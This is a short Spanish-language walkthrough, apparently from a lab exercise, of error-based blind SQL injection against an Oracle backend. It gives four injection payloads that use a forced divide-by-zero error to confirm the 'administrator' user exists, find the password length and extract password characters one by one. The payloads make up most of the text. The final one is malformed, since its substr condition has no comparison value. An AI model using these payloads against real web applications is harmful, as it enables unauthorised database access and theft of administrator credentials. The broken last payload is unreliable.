

En este caso particular creamos un error forzado para cuando la consulta es verdadera para para corroborar la información
Para identificar si un usuario existe cuando cambiamos el nombre del usuario si no esta en la tabla nos da status 500, si nos fijamos cuando se cumple la condición forzamos el erro y a partir de aquí podemos modificar la condición para nuestro beneficio

```
'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
```

Comprobando que estamos por el buen camino probamos con el username, que estamos haciendo aqui, pues estamos cogiendo la a del username administrator y la estamos comparando con b como no se cumple nos da un 200 , si probamos con la a nos da un status 500
```
'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||'
```

Para verificar la longitud de la password y modificamos el length hasta encontrar un stats 500 que confirme que encontramos que el tamaño de la pass es correcto 
```
'||(select case when length(password)=21 then to_char(1/0) else '' end from users where username='administrator')||'
```

Para determinar los caracteres de la pass haríamos esto tener en cuenta que estamos realizando el ejemplo en una BD Oracle con MySQL seria otras sintaxis.
```
'||(select case when substr(password,1,1) then to_char(1/0) else '' end from users where username='administrator')||'
```